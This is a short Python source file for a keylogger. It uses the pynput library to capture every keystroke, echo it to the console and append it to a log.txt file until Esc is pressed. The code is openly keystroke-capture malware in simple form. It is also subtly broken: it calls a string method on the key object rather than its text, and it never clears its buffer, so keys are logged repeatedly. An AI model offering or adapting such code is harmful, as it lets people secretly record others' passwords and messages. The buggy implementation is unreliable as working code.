import pynput
from pynput.keyboard import Key, Listener


class KeyLogger:

    def __init__(self):
        self.count = 0
        self.keys = []


    def OnPress(self, key):
        print(f"{key} pressed")

        self.keys.append(key)
        self.count += 1

        if self.count >= 10:
            self.WriteFile(self.keys)

    
    def OnRelease(self, key):
        if key == Key.esc:
            return False


    def WriteFile(self, keys):
        with open("log.txt", "a") as file:
            for key in self.keys:
                k = str(key).replace("'", "")

                if k.find("space") > 0:
                    file.write("\n")
                elif key.find("Key") == -1:
                    file.write(k)

    
if __name__ == "__main__":
    obj = KeyLogger()
    with Listener(on_press = obj.OnPress, on_release = obj.OnRelease) as listener:
        listener.join()
